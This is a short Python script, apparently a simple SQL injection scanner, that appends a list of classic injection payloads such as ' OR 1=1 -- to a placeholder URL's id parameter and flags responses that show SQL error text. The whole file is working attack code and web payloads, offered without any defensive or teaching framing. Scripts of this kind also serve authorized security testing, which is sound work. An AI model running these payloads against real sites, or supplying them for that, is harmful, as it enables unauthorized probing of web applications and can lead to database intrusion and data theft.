import requests

# Target URL
target_url = "http://example.com/page.php?id="

# Common SQL injection payloads
payloads = [
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' OR 'x'='x' --",
    "' OR 'x'='x' /*",
    "' OR 1=1 LIMIT 1 OFFSET 1 --"
]

print(f"[+] Testing {target_url} for SQL Injection...\n")

for payload in payloads:
    test_url = target_url + payload
    try:
        response = requests.get(test_url, timeout=5)
        print(f"Payload: {payload}")
        print(f"Status Code: {response.status_code}")
        
        if "SQL" in response.text or "syntax" in response.text or "mysql" in response.text.lower():
            print(f"[!] Possible SQL Injection vulnerability detected with payload: {payload}\n")
        else:
            print("[-] No visible SQL error.\n")
    except requests.exceptions.RequestException:
        print(f"[Error] Could not connect to {test_url}\n")

print("[+] Testing complete.")